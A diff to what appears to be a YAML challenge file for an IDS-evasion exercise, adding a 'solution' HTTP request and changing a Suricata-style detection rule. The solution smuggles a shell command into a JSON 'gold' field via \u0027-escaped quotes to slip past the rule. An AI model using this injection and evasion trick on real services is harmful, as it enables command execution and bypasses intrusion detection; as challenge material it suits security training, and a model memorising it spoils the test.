@@ -24,10 +24,23 @@ base_request: |-
     "artifacts": "30"
   }
 
-rules:
+solution: |-
+  POST /backend.php HTTP/1.1
+  Host: localhost
+  Content-Type: application/json
+  Content-Length: 98
 
-# Avoid ';'
+  {
+    "hoardType": "artifact",
+    "gold": "10\u0027;cat /app/valuate-hoard; echo \u0027",
+    "gems": "20",
+    "artifacts": "30"
+  }
+
+solution_note: Using \u00XX encoding
+
+rules:
 - >
-  alert http any any -> any any (msg:"Gotcha!"; flow:to_server,established; http.request_body; content: "\"artifact\""; content: "\;"; sid:123456; rev:1;)
+  alert http any any -> any any (msg:"Gotcha!"; flow:to_server,established; http.request_body; content: "\"artifact\""; content: "'"; sid:123456; rev:1;)
 
 expected_output: "Perform some math"
